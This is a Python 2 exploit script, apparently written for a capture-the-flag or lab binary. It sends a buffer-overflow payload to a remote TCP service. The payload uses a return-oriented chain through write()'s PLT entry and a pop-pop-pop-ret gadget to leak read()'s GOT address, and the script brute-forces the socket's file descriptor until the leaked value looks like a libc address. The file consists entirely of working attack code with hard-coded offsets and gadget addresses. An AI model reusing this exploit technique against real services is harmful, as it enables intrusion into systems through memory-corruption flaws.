#!/usr/bin/python

#this is a simple python script to communicate with server over TCP 
import socket, sys, optparse, subprocess, time
from struct import pack, unpack
from termcolor import colored
#some constants for the vulnerable binary
OFFSET = 1036
WRITE_PLT = pack("<L", 0x080490d0)              #write() 's PLT 
READ_PLT = pack("<L", 0x08049040)               #read() 's PLT
READ_GOT = pack("<L", 0x0804c010)               #read() 's GOT 

PPPR = pack("<L", 0x08048ab9)                   #address of pop pop pop ret gadget

def main():

    options = parse_args()
    for fd in range(3, 1024):

        #opening socket and connecting to the remote server...
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((options.remote_host, options.remote_port))
        msg = server.recv(1024)   
        time.sleep(0.4)
    
        print msg 
        print draw() + colored('Trying to determine file descriptor for socket', 'yellow')
        server.send(leak_addr(fd))
        msg = server.recv(1024)
        time.sleep(0.4)
        READ_ADDR = ''
        try:
            READ_ADDR = unpack('I', server.recv(4))[0]
            if READ_ADDR is not '':
                x = hex(READ_ADDR)[2:4]
                if x == 'f7':
                    print "The correct file descriptor is " + colored(str(fd), 'red')
                    server.close()
                    break
        except Exception as e:
            print "exception hit!"
            continue
        server.close() 
    return

def parse_args():
    parser = optparse.OptionParser()
    parser.add_option('-H', '--remote-host', dest='remote_host', type='str')
    parser.add_option('-P', '--remote-port', dest='remote_port', type='int')
    parser.add_option('-k', '--attacker-port', dest='attacker_port', type='int', default=12345)
    try:
        options, remainder = parser.parse_args()
        for attr,val in options.__dict__.iteritems():
            if val is None:
                raise ValueError('Error!! ' + attr + ' is not provided!!')
        return options
    except Exception as e:
        print e
        sys.exit(-1)
    return

def leak_addr(server_fd):
    #stack frame for write() 
    payload = "A" * OFFSET
    payload += WRITE_PLT 
    payload += PPPR                       #pppr 
    payload += pack('<L', server_fd)
    payload += READ_GOT
    payload += pack('<L', 4)              #size of data to be read from the server
    return payload


def draw(char='+', color='green'):
    return '[' + colored(char, color) + '] '

if __name__ == "__main__": main()
